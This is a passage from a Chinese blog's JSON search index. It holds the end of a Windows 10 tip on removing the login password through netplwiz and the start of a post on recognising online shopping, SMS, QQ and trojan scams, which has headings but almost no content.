`netplwiz`\n\n![](/img/netplwiz.png)\n\n3、取消如图勾选\n\n![](/img/win10_1.png)\n\n4、点击应用，此时会弹出一个窗口。你输入原开机密码，确认输入！\n\n![](/img/win10_2.png)\n\n5、点击确定\n\n然后重启就可以看到用户名已经被修改成功啦，开机也不需要密码了！\n\n","tags":["系统"],"categories":["代码笔记"]},{"title":"教你如何识破网络上的陷阱","url":"/2016/10/03/教你识破网络陷阱/","content":"![](http://ww4.sinaimg.cn/mw1024/00674Nvvgw1f8qu3g1e78g30dw05y1ky.gif)\n### 导读\n网络繁荣的今天同时也会促进另一个行业的兴起->诈骗,本篇博文会结合本人十几年的网络经验跟大家谈一谈。内容会涉及到网购诈骗、短信诈骗、QQ诈骗以及最厉害的木马诈骗。\n<!-- more -->\n### 网购诈骗\n网购诈骗一般都是存在与两种方式\n- 1、支付诈骗\n- 2、退款诈骗\n\n情景分析\n### 短信诈骗\n### QQ诈骗\n### 木马诈骗\n\n\n","tags":["网购"],"categories":["生活笔记"]}]